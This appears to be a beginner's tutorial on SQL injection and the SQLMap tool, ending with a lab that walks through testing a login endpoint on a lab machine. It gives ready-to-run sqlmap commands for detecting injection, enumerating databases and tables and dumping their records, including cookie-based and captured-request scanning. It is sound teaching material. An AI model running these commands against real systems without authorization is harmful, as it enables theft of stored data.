# SQL Injection

**SQL Injection (SQLi)** is one of the most common and dangerous web application vulnerabilities.

It allows an attacker to manipulate the SQL queries that a website sends to its database.

If a website does not properly validate user input, an attacker may be able to:

* Read sensitive information
* Bypass login pages
* Modify or delete data
* Gain unauthorized access to the database

To understand SQL Injection, we first need to understand how websites use databases.

# What is a Database?

A **database** is an organized collection of data.

It stores information in a structured way so that it can be:

* Stored
* Retrieved
* Updated
* Deleted

Some examples of data stored in a database are:

* User accounts
* Passwords (hashed)
* Product information
* Orders
* Employee records
* Book information

Without a database, websites would have no way to remember information.


# Why Do Websites Need Databases?

Many websites allow users to:

* Log in
* Register
* Search for products
* View profiles
* Place orders

To perform these actions, the website must store and retrieve data.

For example, when you log into a website, your username and password are not stored in the webpage itself—they are stored in a database.


# How Does the Website Communicate with the Database?

A website cannot directly understand database operations.

Instead, it uses a **Database Management System (DBMS)**.

A **DBMS** is software that manages databases.

It receives SQL queries from the website, executes them, and returns the results.

Some popular DBMSs are:

* MySQL
* PostgreSQL
* SQLite
* Microsoft SQL Server
* Oracle Database


# What is SQL?

**SQL (Structured Query Language)** is the language used to communicate with databases.

Web applications use SQL to:

* Retrieve data
* Insert data
* Update data
* Delete data

For example, when you log in, the website sends an SQL query to check your credentials.

Similarly, when you search for a product, the website sends another SQL query to retrieve matching records.

-------------
# How SQL Injection Works

In the previous section, we learned that websites communicate with databases using **SQL queries**.

In this section, we'll understand **how SQL Injection happens** and why it is dangerous.


# Normal Login Process

Suppose a website has the following login page:

**Username:** John

**Password:** Un@detectable444

When you click **Login**, the website creates an SQL query and sends it to the database.

Example query:

```sql
SELECT * FROM users
WHERE username = 'John'
AND password = 'Un@detectable444';
```


## What does this query do?

The database checks two conditions:

1. Does a user named **John** exist?
2. Is John's password **Un@detectable444**?

Both conditions must be **true** because they are connected with the **AND** operator.


# Where Does SQL Injection Occur?

SQL Injection occurs when a website **does not properly validate or sanitize user input**.

### What is Input Validation?

Input validation means checking whether the user's input is safe before using it.

For example, the website should reject unexpected characters or treat everything the user enters as plain data instead of executable SQL.

If the website fails to do this, user input can change the SQL query.


# Why Is SQL Injection Dangerous?

Most organizations store important information inside databases, such as:

* User accounts
* Passwords (hashed)
* Customer information
* Employee records
* Financial data

If an attacker can manipulate SQL queries, they may gain unauthorized access to this data.
-----------

# SQLMap - Automated SQL Injection Tool

Finding and exploiting SQL Injection manually can be difficult and time-consuming.

**SQLMap** is an automated tool that detects and tests for SQL Injection vulnerabilities.

Instead of manually creating SQL injection payloads, SQLMap automates most of the work

# What is SQLMap?

**SQLMap** is an open-source command-line tool used to:

* Detect SQL Injection vulnerabilities.
* Identify the database type.
* Enumerate databases and tables.
* Extract information from vulnerable databases.

It automates many of the tasks that would otherwise require manual SQL injection testing.

 

# Basic Workflow of SQLMap

SQLMap usually follows these steps:

1. Identify a possible SQL Injection point.
2. Test whether the parameter is vulnerable.
3. Identify the database management system (DBMS).
4. Enumerate databases.
5. Enumerate tables.
6. Enumerate columns.
7. Extract data (when authorized).

# Getting Help

SQLMap provides many command-line options.

To view all available options:

```bash
sqlmap --help
```

# Wizard Mode (Beginner Friendly)

If you're new to SQLMap, use **Wizard Mode**.

```bash
sqlmap --wizard
```

Instead of remembering commands, SQLMap asks questions step by step, making it easier for beginners.

# Step 1: Test a URL

The first step is to identify whether a URL is vulnerable.

SQLMap tests the supplied URL and checks whether user-controlled parameters are injectable.

Example:

```bash
sqlmap -u http://example.com/search?cat=1
```

If a vulnerability exists, SQLMap identifies:

* Which parameter is vulnerable.
* The database type.
* Supported SQL injection techniques.


# What Does SQLMap Detect?

SQLMap may report different SQL Injection techniques.

Some common techniques are:

### Boolean-Based Blind SQL Injection

Uses **true/false conditions** to determine whether SQL Injection is possible.

Example concept:

```text
Condition is TRUE → Response A

Condition is FALSE → Response B
```

By observing the application's responses, SQLMap can gradually retrieve information.

### Error-Based SQL Injection

Forces the database to generate error messages.

Sometimes these errors reveal useful information about:

* Database names
* Table names
* SQL syntax
* Database version


### Time-Based Blind SQL Injection

Makes the database intentionally wait before responding.

Example concept:

```text
If condition is TRUE
↓

Database waits 5 seconds
```

The response time tells SQLMap whether the injected condition was true or false.

### UNION-Based SQL Injection

Uses SQL's **UNION** operator to combine legitimate query results with attacker-controlled results.

This can allow data from additional tables to be returned in the application's response.


# Step 2: Enumerate Databases

Once SQLMap confirms a vulnerability, it can list the available databases.

Example:

```bash
sqlmap -u http://example.com/search?cat=1 --dbs
```

This displays all accessible database names.


# Step 3: List Tables

After selecting a database, SQLMap can enumerate its tables.

Example:

```bash
sqlmap -u http://example.com/search?cat=1 -D users --tables
```

This lists the tables inside the selected database.


# Step 4: Dump Table Data

After selecting a table, SQLMap can retrieve its contents.

Example:

```bash
sqlmap -u http://example.com/search?cat=1 -D users -T employees --dump
```

If permitted during an authorized assessment, SQLMap extracts the table's records.


# GET-Based Testing

Many websites pass data through **URL parameters**.

Example:

```text
http://example.com/search?cat=1
```

Here:

* `cat` → Parameter
* `1` → Value

SQLMap can test these parameters directly using the `-u` option.


# Cookie-Based Testing

Some pages require authentication.

In these cases, simply providing the URL may not work because the server expects a valid session.

SQLMap supports authenticated testing by sending session cookies.

Example:

```bash
sqlmap --cookie="SESSIONID=abcdef123456"
```

This allows SQLMap to test pages that are only accessible after logging in.


# POST-Based Testing

Not all applications send data through URL parameters.

Login forms, registration forms, and contact forms usually send data using **HTTP POST**.

For these cases:

1. Capture the HTTP request.
2. Save it to a text file.
3. Tell SQLMap to use that request.

Example:

```bash
sqlmap -r intercepted_request.txt
```

This allows SQLMap to test POST requests instead of GET requests.

--------

# Practical SQLMap Lab

# Lab Setup

1. Start the **Lab Machine**.
2. Start the **AttackBox** (recommended).
3. Open the vulnerable login page:

```text
http://MACHINE_IP/ai/login
```

Replace **MACHINE_IP** with the IP address assigned to your lab machine.


# Why Can't We Directly Use This URL?

The login page itself is:

```text
http://MACHINE_IP/ai/login
```

This URL **does not contain any GET parameters**.

SQLMap needs the **actual request** that sends the username and password.


# How to Find the GET Request
```text
1. Open the login page.
2. Right-click → **Inspect**.
3. Open the **Network** tab.
4. Enter any test username and password.
5. Click **Login**.
6. Look for the request that was sent.
7. Copy its full URL.

If you cannot capture it yourself, use the provided URL:

```text
http://MACHINE_IP/ai/includes/user_login?email=test&password=test
```
```

# Why Put the URL Inside Quotes?

Always place the URL inside **single quotes**.

Example:

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test'
```

### Why?

The URL contains special characters like:

* `?`
* `&`

Without quotes, the Linux shell may interpret these characters instead of passing them correctly to SQLMap.


# SQLMap Commands

## 1. Test for SQL Injection

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --level=5
```

This checks whether the URL is vulnerable.

## 2. List Databases

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' --dbs --level=5
```

Lists all available databases.


## 3. List Tables

Replace **DATABASE_NAME** with the database you discovered.

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' -D DATABASE_NAME --tables --level=5
```

Lists all tables inside the selected database.

## 4. Dump Table Data

Replace both placeholders with the correct values.

```bash
sqlmap -u 'http://MACHINE_IP/ai/includes/user_login?email=test&password=test' -D DATABASE_NAME -T TABLE_NAME --dump --level=5
```

Retrieves the records from the selected table.


# Why Use `--level=5`?

The default scan level is relatively quick.

Some vulnerabilities require more extensive testing.

```bash
--level=5
```

performs a more thorough scan and increases the chance of detecting SQL Injection.


# SQLMap Questions During the Scan

SQLMap may ask several questions.

For this lab, answer them as follows:

| Question                           | Answer |
| ---------------------------------- | ------ |
| Skip payloads for other DBMS?      | **y**  |
| Include all MySQL tests?           | **y**  |
| Try random integer for UNION?      | **y**  |
| Continue testing other parameters? | **n**  |

---
